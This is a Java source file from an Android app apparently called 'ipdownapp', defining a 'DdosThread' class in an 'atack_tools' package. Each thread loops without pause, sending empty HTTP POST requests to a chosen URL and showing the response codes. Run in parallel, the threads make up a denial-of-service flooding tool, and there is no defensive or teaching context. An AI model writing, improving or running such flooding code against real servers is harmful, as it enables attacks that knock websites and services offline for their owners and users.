package com.example.ipdownapp.atack_tools;

import android.os.Looper;
import android.os.MessageQueue;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DdosThread extends Thread{

    public static Notificable notificable;

    private static int autoId = 0;

    private int id;

    private AtomicBoolean running = new AtomicBoolean(true);
    private String request;
    private URL url;

    public DdosThread(){
        this.id = ++autoId;
    }

    public void setRequestURL(String request) {
        this.request = request;
        try{
            this.url = new URL(request);
        }catch (Exception e){
        }
    }

    @Override
    public void run() {

        while (running.get()) {

            try {
                attack();
            } catch (Exception e) {
                notificar("Error de peticion");
            }
        }
    }

    public void attack() throws Exception {
        HttpURLConnection connection = null;
        OutputStream out = null;
        InputStream in = null;
        StringBuilder respuesta = new StringBuilder();

        //Creamos un objeto connection
        connection = (HttpURLConnection) this.url.openConnection();
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setDoInput(true);
        connection.setDoOutput(true);

        String cadena = "";
        byte[] data = cadena.getBytes("utf-8");

        out = connection.getOutputStream();
        out.write(data);
        out.close();

        in = connection.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line = null;

        while ((line = reader.readLine()) != null) {
            respuesta.append(line);
        }

        if (out != null) out.close();

        if (in != null) in.close();

        if (connection != null) connection.disconnect();

        System.out.println(connection.getResponseCode());

        notificar("Reponse code -> "+ connection.getResponseCode());

    }


    private void notificar(String mensaje){


        notificable.getActivity().runOnUiThread(new Runnable() {
            @Override
            public void run() {
                notificable.notificar("Thread " + id + ": " + mensaje);
            }
        });


    }

}
